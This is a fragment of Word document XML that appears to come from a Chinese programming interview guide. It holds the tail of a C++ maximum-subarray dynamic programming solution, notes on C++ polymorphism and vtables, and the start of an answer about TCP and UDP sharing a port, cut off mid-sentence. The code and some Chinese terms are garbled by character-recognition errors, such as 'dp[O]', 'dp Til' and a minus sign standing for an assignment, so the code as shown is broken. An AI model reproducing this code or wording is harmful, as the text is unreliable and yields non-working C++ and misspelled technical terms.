          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>int x;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2060" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>cin &gt;&gt; x;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="100" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2060" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>arr.push_back(x);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1640" w:right="0" w:firstLine="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1640" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>vector&lt;LL&gt; dp(n, 0);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1640" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>LL ans = arr[0];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1640" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>dp[O] = arr [0];</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1640" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>for (int i = 1; i &lt; n; i++) {</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="2060" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">dp[i] = dp[i - 1] &lt; 0 ? arr[i] </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">dp[i - 1] + arr[i]; ans </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">- </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>max (dp Til, ans);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="360" w:line="315" w:lineRule="exact"/>
        <w:ind w:left="1640" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>cout &lt;&lt; ans &lt;&lt; endl;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="300" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="1220" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>return 0;</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
        <w:pBdr>
          <w:top w:val="single" w:color="auto" w:sz="4" w:space="0"/>
        </w:pBdr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="709"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="340" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="246" w:name="bookmark257"/>
      <w:bookmarkEnd w:id="246"/>
      <w:bookmarkStart w:id="247" w:name="bookmark255"/>
      <w:bookmarkStart w:id="248" w:name="bookmark256"/>
      <w:bookmarkStart w:id="249" w:name="bookmark258"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>多态的实现原理</w:t>
      </w:r>
      <w:bookmarkEnd w:id="247"/>
      <w:bookmarkEnd w:id="248"/>
      <w:bookmarkEnd w:id="249"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="800"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="250" w:name="bookmark259"/>
      <w:bookmarkEnd w:id="250"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>virtual</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>关键字申明的函数叫做虚函数，虚函数肯定是类的成员函数。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="815"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="251" w:name="bookmark260"/>
      <w:bookmarkEnd w:id="251"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>存在虚函数的类都有一个一维的虚函数表叫做虚表。当类中声明虚函数时，编译器 会在类中生成一个虚函数表。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="815"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="252" w:name="bookmark261"/>
      <w:bookmarkEnd w:id="252"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>类的对象有一个指向虚表开始的虚指外。虚表是和类对应的，虚表指针是和对象对 应的。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="815"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="253" w:name="bookmark262"/>
      <w:bookmarkEnd w:id="253"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>虚函数表是一个存储类成员函数指针的数据结构。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="815"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="254" w:name="bookmark263"/>
      <w:bookmarkEnd w:id="254"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>虚函数表是由编译器自动生成与维护的。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="830"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="255" w:name="bookmark264"/>
      <w:bookmarkEnd w:id="255"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>virtual</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>成员函数会被编译器放入虚函数表中。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="845"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:bookmarkStart w:id="256" w:name="bookmark265"/>
      <w:bookmarkEnd w:id="256"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>当存在虚函数时，每个对象中都有一个指向虚函数的指针</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>（CH</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>编译器给父类对象, 子类对象提前布局</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>vptr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>指针）,当进行</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>test （parent *base）</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>函数的时候，</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>C++</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>编译器 不需要区分子类或者父类对象，只需要再</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>base</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>指针中，找到</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>vptr</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>指针即可）。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="36"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="830"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="307" w:lineRule="exact"/>
        <w:ind w:left="0" w:right="0" w:firstLine="480"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="257" w:name="bookmark266"/>
      <w:bookmarkEnd w:id="257"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>vptr-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>般作为类对象的第一个成员。</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="27"/>
        <w:keepNext/>
        <w:keepLines/>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="35"/>
        </w:numPr>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:tabs>
          <w:tab w:val="left" w:pos="709"/>
        </w:tabs>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="340" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0" w:right="0" w:firstLine="0"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:bookmarkStart w:id="258" w:name="bookmark269"/>
      <w:bookmarkEnd w:id="258"/>
      <w:bookmarkStart w:id="259" w:name="bookmark267"/>
      <w:bookmarkStart w:id="260" w:name="bookmark268"/>
      <w:bookmarkStart w:id="261" w:name="bookmark270"/>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>同一个</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>IP</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>同一个端口可以同时建立</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>tcp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:eastAsia="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>udp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
        </w:rPr>
        <w:t>的连接吗</w:t>
      </w:r>
      <w:bookmarkEnd w:id="259"/>
      <w:bookmarkEnd w:id="260"/>
      <w:bookmarkEnd w:id="261"/>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="11"/>
        <w:keepNext w:val="0"/>
        <w:keepLines w:val="0"/>
        <w:widowControl w:val="0"/>
        <w:shd w:val="clear" w:color="auto" w:fill="auto"/>
        <w:bidi w:val="0"/>
        <w:spacing w:before="0" w:after="420" w:line="311" w:lineRule="exact"/>
        <w:ind w:left="480" w:right="0" w:firstLine="20"/>
        <w:jc w:val="both"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>可以，同一个端口虽然</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>udp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>和</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>tcp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t xml:space="preserve">的端口数字是一样的，但实质他们是不同的端口，所 以是没有影响的，从底层实质分析，对于每一个连接内核维护了一个五元组，包含了源 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ip,</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="zh-TW" w:eastAsia="zh-TW" w:bidi="zh-TW"/>
        </w:rPr>
        <w:t>目的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
          <w:lang w:val="en-US" w:eastAsia="en-US" w:bidi="en-US"/>
        </w:rPr>
        <w:t>ip、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
          <w:spacing w:val="0"/>
          <w:w w:val="100"/>
          <w:position w:val="0"/>
